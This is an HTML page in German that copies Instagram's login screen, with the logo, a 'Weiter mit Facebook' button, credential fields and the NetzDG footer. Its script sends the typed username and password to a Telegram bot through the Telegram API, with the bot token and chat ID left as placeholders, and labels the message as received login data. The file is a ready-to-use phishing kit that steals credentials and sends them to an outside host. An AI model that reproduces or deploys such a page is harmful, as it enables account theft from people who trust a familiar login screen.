<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #000; /* Schwarzer Hintergrund */
      color: #fff; /* Wei√üer Text */
      flex-direction: column;
    }

    .login-container {
      width: 100%;
      max-width: 350px;
      text-align: center;
    }

    .login-container img {
      width: 80px; /* Verkleinertes Instagram-Logo */
      margin-bottom: 10px; /* Logo h√∂her schieben */
    }

    .login-container h1 {
      font-size: 32px; /* Gr√∂√üerer Instagram-Schriftzug */
      margin-bottom: 20px;
    }

    .facebook-btn {
      background-color: #1877f2;
      color: #fff;
      height: 40px; /* Feste H√∂he f√ºr Button */
      font-size: 14px;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-bottom: 20px;
      display: flex;
      align-items: center; /* Logo und Text zentrieren */
      justify-content: center;
      width: 100%; /* Button zentrieren */
      max-width: 280px; /* Maximale Breite */
      transition: background-color 0.3s;
    }

    .facebook-btn:hover {
      background-color: #145db2;
    }

    .facebook-btn img {
      margin-right: 8px; /* Abstand zwischen Logo und Text */
      width: 20px;
      height: 20px;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 20px 0;
      color: #8e8e8e;
      font-size: 14px;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background-color: #8e8e8e;
      margin: 0 10px;
    }

    .form-container {
      text-align: left;
    }

    .form-container input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #262626;
      border-radius: 4px;
      background-color: #121212;
      color: #fff;
      outline: none;
      font-size: 14px;
    }

    .form-container input::placeholder {
      color: #8e8e8e;
    }

    .form-container a {
      display: block;
      text-align: right;
      color: #3897f0;
      font-size: 12px;
      margin: 12px 0; /* Gleicher Abstand zu anderen Elementen */
      text-decoration: none;
      cursor: pointer;
    }

    .form-container a:hover {
      text-decoration: underline;
    }

    .form-container button {
      background-color: #3897f0;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: bold;
      width: 100%;
      margin-top: 15px; /* Button leicht nach oben verschieben */
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .form-container button:hover {
      background-color: #3078d9;
    }

    .register-container {
      margin-top: 20px; /* Gleicher Abstand wie Passwort vergessen */
      font-size: 12px;
      color: #8e8e8e;
    }

    .register-container a {
      color: #3897f0; /* Einheitliches Blau */
      text-decoration: none;
      cursor: pointer;
    }

    .register-container a:hover {
      text-decoration: underline;
    }

    .footer {
      margin-top: 20px;
      font-size: 10px;
      color: #8e8e8e;
      text-align: center;
      line-height: 1.5;
      width: 80%;
    }

    /* Media Query f√ºr kleinere Ger√§te */
    @media (max-width: 600px) {
      .login-container {
        width: 90%;
        padding: 20px;
      }

      .login-container img {
        width: 70px; /* Noch kleineres Logo f√ºr Handy */
      }

      .login-container h1 {
        font-size: 28px; /* Etwas kleinerer Schriftzug auf Handys */
      }

      .facebook-btn {
        font-size: 12px;
        height: 38px; /* Kleinere H√∂he f√ºr mobile Ger√§te */
        justify-content: center;
      }

      .form-container input {
        font-size: 14px;
        padding: 8px;
      }

      .form-container button {
        font-size: 14px;
        padding: 10px;
      }

      .footer {
        font-size: 10px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <!-- Logo -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
    <h1>Instagram</h1>

    <!-- Facebook Button -->
    <button class="facebook-btn">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Icon">
      Weiter mit Facebook
    </button>

    <!-- Divider -->
    <div class="divider">ODER</div>

    <!-- Login Form -->
    <div class="form-container">
      <input type="text" id="username" placeholder="Telefonnummer, Benutzername oder E-Mail">
      <input type="password" id="password" placeholder="Passwort">
      <a href="#">Passwort vergessen?</a>
      <button type="button" onclick="sendToTelegram()">Anmelden</button>
    </div>

    <!-- Registrierung -->
    <div class="register-container">
      <p>Du hast kein Konto? <a href="#">Registrieren</a></p>
    </div>
  </div>

  <!-- Footer -->
  <div class="footer">
    Du kannst in deinem Land auch dann <a href="#" class="link">Melden von Inhalten</a>, die deiner Ansicht nach im Sinne des Netzwerkdurchsetzungsgesetzes (NetzDG) rechtswidrig sind, wenn du nicht eingeloggt bist.
  </div>

  <script>
    // Telegram-Bot-Informationen
    const BOT_TOKEN = "DEIN_BOT_TOKEN"; // Ersetze mit deinem Bot-Token
    const CHAT_ID = "DEINE_CHAT_ID";   // Ersetze mit deiner Chat-ID

    function sendToTelegram() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      if (!username || !password) {
        alert("Bitte alle Felder ausf√ºllen!");
        return;
      }

      const message = "üõë Login-Daten erhalten:\n\nüìß Benutzername/E-Mail: " + username + "\nüîë Passwort: " + password;

      const telegramApiUrl = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

      fetch(telegramApiUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      })
        .then(function (response) {
          return response.json();
        })
        .then(function (data) {
          if (data.ok) {
            alert("Daten erfolgreich gesendet!");
          } else {
            alert("Fehler: " + data.description);
          }
        })
        .catch(function (error) {
          alert("Ein Fehler ist aufgetreten: " + error.message);
        });
    }
  </script>
</body>
</html>
